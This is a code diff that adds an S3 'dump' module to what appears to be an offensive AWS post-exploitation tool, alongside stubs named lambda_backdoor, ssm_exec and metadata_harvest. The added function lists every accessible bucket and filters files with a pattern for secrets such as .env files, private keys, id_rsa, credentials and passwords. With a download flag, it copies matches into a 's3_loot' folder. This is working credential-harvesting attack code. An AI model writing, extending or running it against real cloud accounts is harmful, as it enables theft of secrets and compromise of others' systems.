@@ -214,6 +214,46 @@ async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> 
   return { output: `ERROR: Unknown method: ${method}`, findings: [] }
 }
 
+async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const bucket = argVal(args, "--bucket")
+  const pattern = argVal(args, "--pattern")
+  const download = hasFlag(args, "--download")
+  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"
+
+  if (bucket) {
+    const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
+    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
+    const files = r.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
+    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
+    for (const f of files) output.push(`    ${f.trim()}`)
+    if (download && files.length > 0) {
+      for (const f of files.slice(0, 10)) {
+        const key = f.trim().split(/\s+/).pop() || ""
+        const dl = await aws(["s3", "cp", `s3://${bucket}/${key}`, "./s3_loot/"], profile, region, timeout)
+        output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
+      }
+    }
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
+  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings: [] }
+  const buckets = tryJson(r.stdout) || []
+  const output = [`[*] Found ${buckets.length} bucket(s)\n`]
+
+  for (const b of buckets) {
+    const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
+    if (lr.exitCode !== 0) { output.push(`[-] ${b}: access denied`); continue }
+    const files = lr.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
+    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
+    for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
+  }
+
+  return { output: output.join("\n"), findings: [] }
+}
+
 async function stub(name: string): Promise<HookResult> {
   return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
 }
@@ -249,7 +289,7 @@ export const AwshookTool = Tool.define("awshook", {
     const dispatch: Record<Program, () => Promise<HookResult>> = {
       iam_enum: () => iamEnum(params.args, params.timeout_seconds),
       iam_privesc: () => iamPrivesc(params.args, params.timeout_seconds),
-      s3_dump: () => stub("s3_dump"),
+      s3_dump: () => s3Dump(params.args, params.timeout_seconds),
       lambda_backdoor: () => stub("lambda_backdoor"),
       ssm_exec: () => stub("ssm_exec"),
       metadata_harvest: () => stub("metadata_harvest"),
